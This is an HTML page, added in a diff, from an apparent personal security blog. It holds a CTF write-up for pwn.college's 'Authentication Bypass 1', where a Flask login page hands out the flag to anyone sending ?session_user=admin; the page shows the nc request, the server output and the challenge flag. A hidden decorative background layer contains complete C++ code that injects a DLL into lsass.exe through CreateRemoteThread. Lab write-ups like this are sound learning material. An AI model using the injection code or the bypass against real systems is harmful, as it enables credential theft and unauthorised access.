@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication Bypass 1 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Authentication Bypass 1 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Authentication Bypass 1 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-overview">🧠 Challenge Overview</h2>
+
+<p>This challenge provides a Flask-based login system backed by a temporary SQLite database. The goal is to <strong>log in as the <code class="language-plaintext highlighter-rouge">admin</code> user</strong> and retrieve the flag.</p>
+
+<p>The login form is handled by a <code class="language-plaintext highlighter-rouge">/</code> POST route that validates credentials against a temporary SQLite database. The database is initialized with:</p>
+<ul>
+  <li>an <code class="language-plaintext highlighter-rouge">admin</code> user with a <strong>random password</strong></li>
+  <li>a <code class="language-plaintext highlighter-rouge">guest</code> user with password <code class="language-plaintext highlighter-rouge">"password"</code></li>
+</ul>
+
+<p>The main logic of concern:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT rowid, * FROM users WHERE username = ? AND password = ?</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)).</span><span class="nf">fetchone</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="vulnerability">Vulnerability</h2>
+
+<p>There is no SQL injection, as the query is parameterized.</p>
+
+<p>However, there’s a critical GET-based bypass:</p>
+
+<p>In the GET route:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@app.route("/", methods=["GET"])
+def challenge_get():
+    if not (username := flask.request.args.get("session_user", None)):
+        ...
+    else:
+        ...
+        if username == "admin":
+            page += "&lt;br&gt;Here is your flag: " + open("/flag").read()
+</code></pre></div></div>
+<p>The page checks for ?session_user=admin in the GET request, and does not validate if the user has logged in.</p>
+
+<p>So simply accessing:
+http://challenge.localhost/?session_user=admin
+will give us the flag directly without authentication!</p>
+
+<hr />
+
+<h2 id="exploit">Exploit</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hacker@web-security~authentication-bypass-1:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">'GET /?session_user=admin HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n'</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>###Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.10
+Date: Sun, 20 Jul 2025 06:58:33 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 305
+Connection: close
+
+&lt;html&gt;&lt;body&gt;Hello, admin!&lt;br&gt;Here is your flag: pwn.college<span class="o">{</span>gxy6127uLKDuVTho5_zxjRrNvrl.QX5gzMzwSM0IzMyEzW<span class="o">}</span>
+...
+</code></pre></div></div>
+
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>gxy6127uLKDuVTho5_zxjRrNvrl.QX5gzMzwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
